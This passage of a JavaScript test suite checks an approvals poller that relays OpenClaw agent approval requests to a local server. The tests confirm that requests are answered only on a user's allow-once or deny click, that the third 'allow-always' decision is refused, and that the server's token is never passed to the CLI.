    assert.equal(cli.resolves().length, cases.length, "each answer ran once, and a refused one never leaves the approval busy");
  } finally {
    await approvals.stop();
  }
});

test("stop() ends polling: the running call is cut off, no call follows, the list empties and sessions opened later start nothing", async () => {
  const manager = fakeManager();
  manager.open(S1);
  const cli = fakeCli(cutOff);
  const approvals = createOpenclawApprovals({ manager, runCli: cli.run, intervalMs: 20 });
  await waitFor(() => cli.calls.length === 1);
  await approvals.stop();
  assert.equal(cli.calls[0].options.signal.aborted, true);
  await delay(150);
  assert.equal(cli.calls.length, 1);
  assert.deepEqual(approvals.snapshot(), { approvals: [], error: null });
  assert.equal(manager.listenerCount(), 0, "it no longer follows the sessions");
  manager.open(S2);
  await delay(100);
  assert.equal(cli.calls.length, 1);
});

test("source: the approvals module never sends the third decision, never adds a Gateway address or token, never reads the server's environment, and has one resolve command line", async () => {
  const source = await readFile(path.join(root, "server", "runtime", "sessions", "openclaw-approvals.js"), "utf8");
  const code = source
    .replace(/\/\*[\s\S]*?\*\//g, "")
    .replace(/^\s*\/\/.*$/gm, "")
    .replace(/\s\/\/ .*$/gm, "");
  assert.deepEqual(sourceProblems(source), []);
  for (const word of ["allow-always", "--url", "--token", "process.env", "child_process", "spawn("]) {
    assert.equal(code.includes(word), false, `${word} in openclaw-approvals.js`);
  }
  assert.deepEqual(APPROVAL_DECISIONS, ["allow-once", "deny"]);
  assert.ok(Object.isFrozen(APPROVAL_DECISIONS));
  assert.equal(APPROVAL_SUMMARY_MAX, 300);
  assert.equal(code.match(/"resolve"/g)?.length, 1, "one resolve command line");
  assert.match(code, /\["approvals", "resolve", id, decision\]/);
  assert.equal(code.match(/"pending"/g)?.length, 1, "one pending command line");
  assert.match(code, /\["approvals", "pending", "--json"\]/);
});

test("runCli with captureStderr also collects stderr; without it the answer keeps its SP3 shape", SKIP_POSIX, async () => {
  const program = "process.stdout.write('out'); process.stderr.write('err text'); process.exitCode = 3;";
  const options = { env: { PATH: "/usr/bin:/bin" }, cwd: os.tmpdir() };
  assert.deepEqual(await runCli(process.execPath, ["-e", program], { ...options, captureStderr: true }), {
    ok: false,
    code: 3,
    aborted: false,
    stdout: "out",
    stderr: "err text"
  });
  assert.deepEqual(await runCli(process.execPath, ["-e", program], options), { ok: false, code: 3, aborted: false, stdout: "out" });
  const thrown = await runCli("/fake/bin/openclaw", ["approvals"], {
    ...options,
    captureStderr: true,
    spawn: () => {
      throw new Error("spawn EAGAIN");
    }
  });
  assert.deepEqual(thrown, { ok: false, code: null, aborted: false, stdout: "", stderr: "" });
  const controller = new AbortController();
  controller.abort();
  assert.deepEqual(await runCli(process.execPath, ["-e", program], { ...options, signal: controller.signal, captureStderr: true }), {
    ok: false,
    code: null,
    aborted: true,
    stdout: "",
    stderr: ""
  });
});

test("the fake openclaw answers `approvals pending --json` and `approvals resolve` by its two knobs and logs every call", SKIP_POSIX, async () => {
  const home = await realpath(await mkdtemp(path.join(os.tmpdir(), "agent-os-approvals-fake-")));
  try {
    const bin = path.join(home, "fake-bin");
    const logFile = path.join(home, "fake.log");
    await makeFakeAgentBin(bin, { names: ["openclaw"] });
    const env = { PATH: [bin, ...SYSTEM_PATH_DIRS].join(path.delimiter), HOME: home, FAKE_AGENT_LOG: logFile };
    const openclaw = path.join(bin, "openclaw");
    const call = (args, extra = {}) => runCli(openclaw, args, { env, cwd: home, captureStderr: true, ...extra });

    assert.deepEqual(await call(["approvals", "pending", "--json"]), { ok: true, code: 0, aborted: false, stdout: '{"approvals":[]}\n', stderr: "" });
    await setFakeApprovals(home, [fakeApproval({ id: "appr-f1" })]);
    const answered = await call(["approvals", "pending", "--json"]);
    assert.deepEqual(parsePendingApprovals(answered.stdout).map((card) => card.id), ["appr-f1"]);
    await setFakeApprovals(home, "fail");
    assert.deepEqual(await call(["approvals", "pending", "--json"]), { ok: false, code: 1, aborted: false, stdout: "", stderr: "gateway not running\n" });

    assert.deepEqual(await call(["approvals", "resolve", "appr-f1", "deny"]), { ok: true, code: 0, aborted: false, stdout: "resolved appr-f1 deny\n", stderr: "" });
    await setFakeResolve(home, "fail");
    assert.deepEqual(await call(["approvals", "resolve", "appr-f1", "allow-once"]), { ok: false, code: 1, aborted: false, stdout: "", stderr: "approval expired\n" });

    // "slow" never answers in time: cutting the call off ends the fake.
    await setFakeApprovals(home, "slow");
    const controller = new AbortController();
    let pid = null;
    const slow = call(["approvals", "pending", "--json"], { signal: controller.signal, onSpawn: (spawned) => (pid = spawned) });
    await waitFor(() => pid !== null);
    setTimeout(() => controller.abort(), 300);
    assert.equal((await slow).aborted, true);
    await waitFor(() => !isAlive(pid), { timeoutMs: 3000 });

    const entries = await readFakeLog(logFile);
    assert.deepEqual(entries.map((entry) => entry.event), ["approvals-pending", "approvals-pending", "approvals-pending", "approvals-resolve", "approvals-resolve", "approvals-pending"]);
    assert.deepEqual(
      entries.filter((entry) => entry.event === "approvals-resolve").map((entry) => [entry.id, entry.decision, entry.argv]),
      [
        ["appr-f1", "deny", ["approvals", "resolve", "appr-f1", "deny"]],
        ["appr-f1", "allow-once", ["approvals", "resolve", "appr-f1", "allow-once"]]
      ]
    );
  } finally {
    await rm(home, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 });
  }
});

test("GET /api/sessions/approvals and POST /api/sessions/approvals/resolve: fixed paths ahead of :id, the contract's answers, nothing answerable without the poller, and neither address outside local mode", async () => {
  const card = { id: "appr-1", kind: "exec", summary: "npm test", createdAt: "2026-10-29T10:00:00.000Z", expiresAt: "2026-10-29T10:05:00.000Z", sessionId: null };
  const calls = [];
  const approvals = {
    snapshot: () => ({ approvals: [card], error: POLL_FAILED }),
    async resolve(id, decision) {
      calls.push([id, decision]);
      if (decision === "deny") return { message: null };
      throw sessionError(409, "approval_failed", "OpenClaw didn't take that answer: approval expired");
    },
    stop: async () => {}
  };
  await withRouterApp(approvals, async (api) => {
    assert.deepEqual(await api("GET", "/api/sessions/approvals"), { status: 200, body: { approvals: [card], error: POLL_FAILED } });
    assert.deepEqual(await api("POST", "/api/sessions/approvals/resolve", { id: "appr-1", decision: "deny" }), { status: 200, body: { ok: true, message: null } });
    assert.deepEqual(await api("POST", "/api/sessions/approvals/resolve", { id: "appr-1", decision: "allow-once" }), {
      status: 409,
      body: { error: "approval_failed", message: "OpenClaw didn't take that answer: approval expired" }
    });
    await api("POST", "/api/sessions/approvals/resolve", ["appr-1", "deny"]);
    assert.equal((await api("GET", "/api/sessions/approvals/resolve")).status, 404, "only a POST answers");
    assert.deepEqual(calls, [["appr-1", "deny"], ["appr-1", "allow-once"], [undefined, undefined]], "only the body's two fields reach it");
  });
  await withRouterApp(null, async (api) => {
    assert.deepEqual(await api("GET", "/api/sessions/approvals"), { status: 200, body: { approvals: [], error: null } });
    assert.deepEqual(await api("POST", "/api/sessions/approvals/resolve", { id: "appr-1", decision: "deny" }), { status: 404, body: APPROVAL_MISSING });
    assert.deepEqual(await api("POST", "/api/sessions/approvals/resolve", { id: "appr-1", decision: "allow-always" }), { status: 400, body: INVALID_DECISION });
  });
  await withEnv(NOT_LOCAL, () =>
    withRouterApp(approvals, async (api) => {
      assert.deepEqual(await api("GET", "/api/sessions/approvals"), { status: 404, body: { error: "not_available" } });
      assert.deepEqual(await api("POST", "/api/sessions/approvals/resolve", { id: "appr-1", decision: "deny" }), { status: 404, body: { error: "not_available" } });
    })
  );
  assert.equal(calls.length, 3, "outside local mode the poller is never asked");
});

test("server/index.js starts one approvals poller for the shared session manager, stops it at shutdown and hands it to the sessions router", async () => {
  const index = await readFile(path.join(root, "server", "index.js"), "utf8");
  assert.match(index, /^import \{ createOpenclawApprovals \} from "\.\/runtime\/sessions\/openclaw-approvals\.js";$/m);
  assert.equal(index.match(/createOpenclawApprovals\(/g)?.length, 1, "one poller");
  assert.match(index, /const openclawApprovals = createOpenclawApprovals\(\{ manager: sessionManager \}\);/);
  assert.match(index, /registerShutdownTask\("openclaw-approvals", \(\) => openclawApprovals\.stop\(\)\);/);
  assert.match(index, /app\.use\("\/api\/sessions", requireLocalMode, createSessionsRouter\(\{ manager: sessionManager, approvals: openclawApprovals \}\)\);/);
});

test("end to end with the fake OpenClaw CLI: an approval for this session makes it wait and shows on its card, nothing is answered before the click, Allow once sends `approvals resolve <id> allow-once` once, the alert clears when OpenClaw stops listing it, and polling ends with the session", SKIP_POSIX, async () => {
  const home = await realpath(await mkdtemp(path.join(os.tmpdir(), "agent-os-approvals-home-")));
  const agentOsHome = await realpath(await mkdtemp(path.join(os.tmpdir(), "agent-os-approvals-data-")));
  const bin = path.join(home, "fake-bin");
  const logFile = path.join(home, "fake.log");
  const pendingCalls = async () => (await readFakeLog(logFile)).filter((entry) => entry.event === "approvals-pending");
  const resolveCalls = async () => (await readFakeLog(logFile)).filter((entry) => entry.event === "approvals-resolve");
  try {
    await makeFakeAgentBin(bin);
    await withEnv(
      {
        HOME: home,
        USERPROFILE: home,
        AGENT_OS_HOME: agentOsHome,
        HERMES_AGENT_OS_HOME: undefined,
        AGENT_OS_MANAGED_ROOT: path.join(home, ".agent-os"),
        SHELL: FAKE_LOGIN_SHELL,
        PATH: [bin, ...SYSTEM_PATH_DIRS].join(path.delimiter),
        HERMES_AGENT_OS_EXECUTABLE_PATHS: undefined,
        FAKE_AGENT_LOG: logFile,
        FAKE_AGENT_MODE: undefined,
        HERMES_HOME: undefined,
        HERMES_AGENT_OS_ENABLE_EXEC: undefined,
        DEMO_PUBLIC: undefined,
        HERMES_AGENT_OS_DEMO_PUBLIC: undefined,
        HERMES_AGENT_OS_PUBLIC_MODE: undefined,
        HERMES_AGENT_OS_REQUIRE_AUTH: undefined,
        // The server's own token: it must never reach OpenClaw.
        AGENT_OS_TOKEN: "must-not-reach-openclaw"
      },
      async () => {
        assert.equal(os.homedir(), home, "tests must never see the real home folder");
        clearDetectCaches();
        resetLoginShellEnvForTests();
        await setExecutionGateStatus({ enabled: true, reason: "approvals test" });
        const manager = createSessionManager({ ...NO_GIT_OPTIONS });
        const approvals = createOpenclawApprovals({ manager, intervalMs: 150 });
        const app = express();
        app.use(express.json());
        app.use("/api/sessions", requireLocalMode, createSessionsRouter({ manager, approvals }));
        const server = await new Promise((resolve) => {
          const listening = app.listen(0, "127.0.0.1", () => resolve(listening));
        });
        const base = `http://127.0.0.1:${server.address().port}`;
        const api = (method, url, body) => request(base, method, url, body);
        let id = null;
        try {
          await delay(450);
          assert.equal((await pendingCalls()).length, 0, "no OpenClaw session open: OpenClaw is never asked");

          id = (await manager.create({ agentId: "openclaw", folder: null })).id;
          await waitFor(async () => (await pendingCalls()).length >= 1);
          assert.deepEqual((await api("GET", "/api/sessions/approvals")).body, { approvals: [], error: null });

          const row = fakeApproval({ id: "appr-e2e-1", kind: "plugin", sessionKey: keyOf(id), summary: "Deploy:\u0007 push the site" });
          await setFakeApprovals(home, [row]);
          await waitFor(async () => (await manager.get(id)).alert?.kind === "approval");
          const waiting = await manager.get(id);
          assert.equal(waiting.status, "waiting");
          assert.equal(waiting.alert.text, "Deploy: push the site");
          assert.deepEqual((await api("GET", "/api/sessions/approvals")).body, {
            approvals: [{ ...cardOf(row, id), summary: "Deploy: push the site" }],
            error: null
          });

          // Resolve only on the click: three more polls, and still nothing was answered.
          const soFar = (await pendingCalls()).length;
          await waitFor(async () => (await pendingCalls()).length >= soFar + 3);
          assert.deepEqual(await resolveCalls(), []);
          assert.equal((await manager.get(id)).status, "waiting", "the alert stays while the approval waits");

          // The third decision never reaches OpenClaw.
          assert.deepEqual(await api("POST", "/api/sessions/approvals/resolve", { id: "appr-e2e-1", decision: "allow-always" }), { status: 400, body: INVALID_DECISION });
          assert.deepEqual(await resolveCalls(), []);

          // The click.
          assert.deepEqual(await api("POST", "/api/sessions/approvals/resolve", { id: "appr-e2e-1", decision: "allow-once" }), { status: 200, body: { ok: true, message: null } });
          assert.deepEqual(
            (await resolveCalls()).map((entry) => [entry.id, entry.decision, entry.argv]),
            [["appr-e2e-1", "allow-once", ["approvals", "resolve", "appr-e2e-1", "allow-once"]]]
          );

          // OpenClaw stops listing it: the alert clears and the card goes.
          await setFakeApprovals(home, []);
          await waitFor(async () => (await manager.get(id)).alert === null);
          assert.notEqual((await manager.get(id)).status, "waiting");
          await waitFor(async () => (await api("GET", "/api/sessions/approvals")).body.approvals.length === 0);

          // A refused answer comes back in OpenClaw's own words.
          const second = fakeApproval({ id: "appr-e2e-2", sessionKey: keyOf(id) });
          await setFakeApprovals(home, [second]);
          await setFakeResolve(home, "fail");
          await waitFor(async () => (await api("GET", "/api/sessions/approvals")).body.approvals.some((card) => card.id === "appr-e2e-2"));
          assert.deepEqual(await api("POST", "/api/sessions/approvals/resolve", { id: "appr-e2e-2", decision: "deny" }), {
            status: 409,
            body: { error: "approval_failed", message: "OpenClaw didn't take that answer: approval expired" }
          });

          // A newer approval arrives and then leaves while the older one is still pending (fix round 1, M3): the one alert
          // names the newest, then the one that is left, and it is the same alert, so no second "permission asked" marker.
          const permissionMarkers = async () => (await manager.markers(id)).filter((marker) => marker.type === "permission").length;
          await waitFor(async () => (await manager.get(id)).alert?.text === "npm run build");
          await delay(300);
          const markersBefore = await permissionMarkers();
          const third = fakeApproval({ id: "appr-e2e-3", sessionKey: keyOf(id), summary: "git push origin main", createdAtMs: second.createdAtMs + 1000 });
          await setFakeApprovals(home, [second, third]);
          await waitFor(async () => (await manager.get(id)).alert?.text === "git push origin main");
          await setFakeApprovals(home, [second]);
          await waitFor(async () => (await manager.get(id)).alert?.text === "npm run build");
          await delay(300);
          assert.equal((await manager.get(id)).status, "waiting");
          assert.equal(await permissionMarkers(), markersBefore, "a new text of the same alert: no new marker");

          // The Gateway is down: the note, and the last list stays.
          await setFakeApprovals(home, "fail");
          await waitFor(async () => (await api("GET", "/api/sessions/approvals")).body.error !== null);
          const down = (await api("GET", "/api/sessions/approvals")).body;
          assert.equal(down.error, POLL_FAILED);
          assert.deepEqual(down.approvals.map((card) => card.id), ["appr-e2e-2"]);

          // Every call had the session's own environment (never the server's token), its folder, and no Gateway address or token.
          for (const entry of [...(await pendingCalls()), ...(await resolveCalls())]) {
            assert.deepEqual(entry.agentOsKeys, ["AGENT_OS_SESSION_ID"], "the session's environment, not the server's");
            assert.equal(entry.cwd, home);
            assert.ok(!entry.argv.some((arg) => arg.startsWith("--url") || arg.startsWith("--token")), entry.argv.join(" "));
          }

          // The session ends: polling stops and the list empties.
          await manager.stop(id, { by: "stop" });
          await waitFor(() => manager.liveAgentSessions("openclaw").length === 0);
          await delay(500);
          const settled = (await pendingCalls()).length;
          await delay(600);
          assert.equal((await pendingCalls()).length, settled, "no OpenClaw session open: no more calls");
          assert.deepEqual((await api("GET", "/api/sessions/approvals")).body, { approvals: [], error: null });
        } finally {
          await approvals.stop();
          await manager.shutdownAll({ reason: "quit" });
          if (id) {
            await waitFor(
              async () => {
                try {
                  return JSON.parse(await readFile(path.join(agentOsHome, "sessions", id, "meta.json"), "utf8")).status === "exited";
                } catch {
                  return false;
                }
              },
              { timeoutMs: 5000 }
            ).catch(() => {});
          }
          server.closeAllConnections?.();
          await new Promise((resolve) => server.close(resolve));
          resetLoginShellEnvForTests();
          clearDetectCaches();
        }
      }
    );
  } finally {
    await rm(home, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 });
    await rm(agentOsHome, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 });
  }
});
